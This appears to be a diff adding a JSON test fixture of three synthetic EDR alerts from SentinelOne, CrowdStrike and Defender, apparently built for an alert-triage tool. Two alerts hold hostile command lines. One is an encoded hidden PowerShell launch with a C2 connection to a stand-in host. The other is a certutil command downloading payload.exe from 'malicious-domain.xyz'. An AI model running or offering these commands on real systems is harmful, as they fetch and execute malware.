@@ -1,0 +1,84 @@
+[
+  {
+    "platform": "sentinelone",
+    "raw_log": {
+      "alert_id": "s1-alert-9921",
+      "tenant_id": "tenant-beta",
+      "timestamp": "2026-06-23T12:30:00Z",
+      "severity": "HIGH",
+      "threat_name": "Suspicious Svchost Execution",
+      "threat_status": "active",
+      "user_name": "public_user",
+      "user_domain": "WORKGROUP",
+      "process_name": "svchost.exe",
+      "process_path": "C:\\Users\\Public\\svchost.exe",
+      "command_line": "C:\\Users\\Public\\svchost.exe",
+      "parent_process_name": "powershell.exe",
+      "parent_command_line": "powershell.exe -windowstyle hidden -nop -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAdwBlAGIAYwBsAGkAZQBuAHQA...",
+      "target_file_path": "C:\\Users\\Public\\svchost.exe",
+      "target_file_sha256": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
+      "network_connections": [
+        {
+          "destination_ip": "203.0.113.12",
+          "destination_port": 4444,
+          "domain_name": "c2-server.com"
+        }
+      ]
+    }
+  },
+  {
+    "platform": "crowdstrike",
+    "raw_log": {
+      "alert_id": "cs-alert-4402",
+      "tenant_id": "tenant-alpha",
+      "timestamp": "2026-06-23T11:00:00Z",
+      "severity": "low",
+      "event_simpleName": "ProcessRollup2",
+      "event_status": "completed",
+      "UserName": "admin_dave",
+      "UserDomain": "TENANTALPHA",
+      "ImageFileName": "powershell.exe",
+      "FolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -ExecutionPolicy Bypass -File C:\\ProgramData\\TenantAlphaCorp\\scripts\\update_dns_settings.ps1",
+      "ParentImageFileName": "explorer.exe",
+      "ParentCommandLine": "C:\\Windows\\explorer.exe",
+      "SHA256HashData": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+      "FilePath": "C:\\ProgramData\\TenantAlphaCorp\\scripts\\update_dns_settings.ps1"
+    }
+  },
+  {
+    "platform": "defender",
+    "raw_log": {
+      "id": "mde-alert-7711",
+      "customerId": "tenant-alpha",
+      "createdDateTime": "2026-06-23T10:15:30Z",
+      "severity": "high",
+      "title": "Certutil LOLBin Downloader Executed",
+      "status": "New",
+      "evidence": {
+        "userAccount": {
+          "accountName": "jsmith",
+          "domainName": "TENANTALPHA"
+        },
+        "processDetails": {
+          "name": "certutil.exe",
+          "path": "C:\\Windows\\System32\\certutil.exe",
+          "commandLine": "certutil -urlcache -split -f http://malicious-domain.xyz/payload.exe C:\\Windows\\Temp\\payload.exe",
+          "parentProcessName": "cmd.exe",
+          "parentProcessCommandLine": "cmd.exe /c \"C:\\Windows\\System32\\certutil.exe -urlcache -split -f http://malicious-domain.xyz/payload.exe C:\\Windows\\Temp\\payload.exe\""
+        },
+        "fileDetails": {
+          "fileName": "payload.exe",
+          "filePath": "C:\\Windows\\Temp\\payload.exe",
+          "sha256": "8f43b071e6212176b92a348e3cf34ebc2a210ff4a974b77f1ff18d6e326b2b73"
+        },
+        "networkDetails": {
+          "localIp": "192.168.1.105",
+          "remoteIp": "198.51.100.42",
+          "remotePort": 80,
+          "remoteUrl": "http://malicious-domain.xyz/payload.exe"
+        }
+      }
+    }
+  }
+]
